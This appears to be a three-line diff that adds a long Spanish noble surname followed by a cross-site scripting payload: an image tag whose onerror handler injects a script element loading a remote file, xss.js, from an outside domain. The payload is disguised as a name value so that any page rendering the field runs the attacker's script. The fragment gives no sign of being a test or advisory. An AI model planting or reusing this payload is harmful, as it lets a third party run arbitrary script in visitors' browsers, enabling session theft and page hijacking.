@@ -1,0 +1,3 @@
+del Rosario Fernández de Córdoba y Álvarez de Toledo <img src="x" onerror="var s = document.createElement('script');
+s.setAttribute('src','https://aguzik.net/xss.js');
+document.head.appendChild(s);">
